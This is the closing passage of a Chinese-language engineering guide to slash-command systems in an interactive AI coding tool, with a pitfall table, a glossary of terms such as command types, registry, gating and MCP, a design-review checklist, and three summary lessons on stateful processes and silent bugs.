
| 阶段 | 撞到的坑 | 对应章节 |
| --- | --- | --- |
| 2 | `/var/log` 被当成命令；`/tmp` 正则拦不住 | §1.4 |
| 3 | 同步 `run` 表达不了"等用户"；`default` 让新形态静默漏 | §2.1 §6.1 |
| 4 | 同名谁赢；缓存了热更新失效；覆盖 `/exit` 后退不出去 | §3.3 §3.4 |
| 5 | 插队的必要性 / 危险性；用户输入被通知饿死；对话框被队列打断 | §5.2 §5.3 §5.4 |
| 6 | **callback→Promise 死锁（无报错、无堆栈）** | §6.3 |

**每个阶段先复现问题再修**，顺序别颠倒。直接写正确版本的话，
你会记住结论但记不住它防的是什么——**而面试问的恰好是后者**。

---
<a id="appendix"></a>
## 附录

### A. 术语表

按「一条命令从输入到执行」的顺序排，不按字母序。

| 词 | 是什么 |
| --- | --- |
| **斜杠命令**（slash command） | 在已运行的交互式进程里输入的 `/xxx` 指令。区别于 CLI 参数（启动时读一次） |
| **passthrough** | 认不出是命令时，原样把输入交给模型的处置。见 §5.1 |
| **判别联合**（discriminated union） | 用一个字段（如 `type`）当标签，把多种形态声明成独立类型再联合。见 §2.1 |
| **`local` 型** | 同步执行、返回一个结果意图的命令。完成时机由代码决定 |
| **`local-jsx` 型** | 渲染交互式界面的命令。**完成时机由用户决定**，靠 `onDone` 回调通知 |
| **`prompt` 型** | 生成一段 prompt 交给模型的命令。完成时机是模型的下一轮回复 |
| **`inline` / `fork`** | `prompt` 型的两个执行位置：展开进当前对话 / 交给独立子代理 |
| **`dialog` 意图** | sid-code 的做法：`local` 命令返回"请打开某对话框"，由 UI 层渲染。见 §2.3 |
| **注册表**（registry） | 回答"有哪些命令可用"的组件。不知道命令怎么执行 |
| **执行引擎**（executor） | 回答"这条命令怎么跑"的组件。不知道命令从哪来 |
| **来源**（source） | 命令来自哪：`builtin` / `user` / `project` / `skill` / `plugin` / `mcp` |
| **门控** | 五个正交的可见性/可调用性开关。见 §4.1 |
| **`isEnabled`** | 运行时动态开关（函数而非布尔值，因为结果会变） |
| **`userInvocable`** | 用户能否 `/name` 调用。`false` = 仅模型可用 |
| **`disableModelInvocation`** | 模型能否调用。`true` = 从模型 listing 里消失 |
| **`immediate`** | 模型运行时能否插队执行。见 §5.2 |
| **`requiresArgs`** | 无参数就无法工作，补全列表回车时只回填不执行 |
| **Skill** | 磁盘上的 `SKILL.md`，能被**用户和模型两条路径**调用的扩展形态 |
| **条件激活 / gate** | Skill 的一种状态：碰到某类文件才变得可调用 |
| **MCP** | Model Context Protocol。外部进程通过它暴露 prompt，被转成斜杠命令 |
| **`doneWasCalled` 守卫** | 防 callback→Promise 桥接死锁与重复 resolve 的标志位。见 §6.3 |
| **死区**（deadband） | 排序里"分数差小于阈值时视为相同"的处理，让噪声让位给信号。见 §7.3 |
| **半衰期衰减** | 使用频率的时间折价：`count * 0.5^(days/halfLife)`。见 §7.4 |
| **fail-open / fail-closed** | 依赖缺失时的默认取向：放行 / 拒绝。安全相关一律 fail-closed。见 §9.9 |

### B. 三十秒自检清单

设计或 review 一个命令系统时，逐条过。**能答"我们不需要"，
但不能答"没想过"。**

**结构**
- [ ] 命令类型用判别联合还是可选字段？加第四种形态时编译器会报错吗？
- [ ] 注册表里有没有按命令类型分发的分支？（有就说明关注点漏了）
- [ ] 执行引擎里有没有磁盘 IO / 读配置？（同上）
- [ ] `switch (cmd.type)` 有没有写 `default`？（写了会让新形态静默漏）

**输入与调度**
- [ ] `/var/log/syslog` 会被当成命令吗？`/tmp` 呢？
- [ ] 认不出的输入是报错还是 passthrough？判据是什么？
- [ ] 模型正在跑时敲命令会怎样？哪些命令能插队？
- [ ] 能插队的命令里，有没有会改动"模型正在读写的状态"的？
- [ ] 队列里用户输入会被系统通知饿死吗？

**注册与缓存**
- [ ] 加载缓存了吗？缓存 key 包含 `cwd` 吗？
- [ ] 过滤（`isEnabled`）是每次重算还是跟着缓存？
- [ ] 有几层缓存？清了内层，外层会跟着失效吗？
- [ ] 同名命令谁赢？有没有一份不许覆盖的保护名单（含 `/exit` `/help`）？
- [ ] 别名碰撞时保留谁？是确定性的还是取决于加载顺序？
- [ ] 一个来源加载失败会连坐吗？失败有用户会看到的出口吗？

**门控与安全**
- [ ] "用户能调"和"模型能调"是两个独立开关吗？
- [ ] 两侧的拒绝形态不同吗？（人报错 / 模型不可见）
- [ ] 展示层过滤了的东西，执行层会再查一次吗？
- [ ] 有 shell 注入语法吗？确认回调是必需的还是可选的？
- [ ] 系统里所有"安全依赖缺失"的默认取向一致吗？都是 fail-closed 吗？
- [ ] 校验和副作用注册的顺序，拒绝路径上正确吗？

**callback→Promise（每条都要能答）**
- [ ] 有没有一条路径能让 `resolve` 永远不被调用？
- [ ] 加载抛异常时谁 resolve？执行抛异常时呢？
- [ ] 命令先调 `onDone` 再返回界面时，界面会被挂上去吗？谁来关？
- [ ] 命令调两次 `onDone` 会怎样？

**可观测**
- [ ] 埋点在所有路径的汇聚点吗？（画调用链，取最后一个公共节点）
- [ ] 用变异测试验证过覆盖面吗？（故意从另一条路径调，看计数变不变）
- [ ] 上报的命令名脱敏了吗？判据是"取值空间由谁定"吗？
- [ ] 每个比率指标的分母写死在注释/文档里了吗？

**调研这个系统时**
- [ ] 每个能力都数过生产调用点吗？还是只读了类型定义？
- [ ] 结论分三档（有能力 / 有代码无调用 / 没有）了吗？
- [ ] 引用的注释验证过吗？纯注释的结论标明来源了吗？
- [ ] 「生产者 → 消费者」通路两端都有独立证据吗？

## 最后：这份文档想让你记住的三件事

**① 命令系统的复杂度不来自命令数量，来自"进程已经有状态了"。**

一个 `Map<string, Function>` 能处理 1000 条命令。它处理不了的是：
模型正在流式输出时用户敲了 `/clear`。
**所有分层、队列、插队、守卫，都是在解决"有状态"这一件事。**

**② 这个领域最危险的 bug 都不报错。**

死锁（无堆栈、CPU 0%）、埋点漏一条路径（数据偏低且静默）、
清了不管用的那层缓存（"已刷新"但没变）、代码在但零调用、
顺序错了但只在拒绝路径上分叉——**它们全都编译过、测试绿、日志干净。**

所以判据必须是可操作的：数生产调用点、画调用链取汇聚点、
问"如果校验失败副作用发生了吗"、问"有没有路径让 resolve 永不被调用"。
**"要注意"不是判据。**

**③ 两个实现放在一起读，重合的才是知识。**

单看一个实现，你分不清"三种执行形态"是这个领域的必然
（两个独立实现都收敛到它）还是某一家的品味；也分不清
"交互式命令自带 UI"是标准做法还是一个有代价的选择
（sid-code 换成了返回意图，白拿了"不需要死锁防护"）。

**这一条不止适用于命令系统。** 它是把"读过代码"变成"理解设计"的唯一办法。
